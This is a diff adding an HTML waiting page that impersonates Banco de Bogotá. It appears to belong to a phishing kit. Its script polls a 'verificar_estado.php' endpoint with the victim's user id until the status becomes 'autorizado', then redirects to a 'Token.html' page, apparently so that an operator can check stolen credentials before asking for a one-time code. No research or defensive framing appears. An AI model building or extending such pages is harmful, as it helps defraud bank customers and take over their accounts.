@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <link rel="stylesheet" href="loading.css">
+</head>
+<body>
+
+<header class="header">
+    <img src="banco-de-bogota.webp" alt="Banco de Bogotá" class="logo">
+</header>
+
+<div class="loading-container">
+    <div class="loading-spinner"></div>
+</div>
+
+<script>
+function obtenerParametroURL(nombre) {
+    const params = new URLSearchParams(window.location.search);
+    return params.get(nombre);
+}
+
+const idUsuario = obtenerParametroURL('id_usuario');
+
+function verificarEstado() {
+    fetch('verificar_estado.php?id_usuario=' + idUsuario)
+        .then(response => response.json())
+        .then(data => {
+            if (data.estado === "autorizado") {
+                window.location.href = "Token.html";
+            } else {
+                setTimeout(verificarEstado, 2000);
+            }
+        })
+        .catch(error => console.error("Error al verificar el estado:", error));
+}
+
+verificarEstado();
+</script>
+
+</body>
+</html>
